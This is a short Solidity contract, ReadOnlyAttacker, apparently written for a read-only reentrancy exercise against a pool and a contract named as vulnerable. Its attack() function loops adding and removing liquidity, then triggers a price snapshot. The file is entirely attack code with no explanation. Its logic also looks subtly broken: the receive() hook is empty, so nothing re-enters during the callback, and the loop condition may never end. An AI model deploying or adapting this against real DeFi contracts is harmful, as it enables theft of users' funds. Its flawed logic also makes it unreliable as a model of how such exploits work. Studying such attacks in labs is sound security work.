// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "hardhat/console.sol";

interface IReadOnlyPool {
    function addLiquidity() external payable;

    function removeLiquidity() external;

    function getVirtualPrice() external view returns (uint256 virtualPrice);

    function totalSupply() external returns (uint256);
}

interface IVulnerableDeFiContract {
    function snapshotPrice() external;
}

contract ReadOnlyAttacker {
    address pool;
    address defi;

    constructor(address _pool, address _defi) {
        pool = _pool;
        defi = _defi;
    }

    function attack() public payable {
        while (IReadOnlyPool(pool).getVirtualPrice() > 0) {
            IReadOnlyPool(pool).addLiquidity{value: address(this).balance}();
            IReadOnlyPool(pool).removeLiquidity();
        }
        IVulnerableDeFiContract(defi).snapshotPrice();
    }

    receive() external payable {}
}
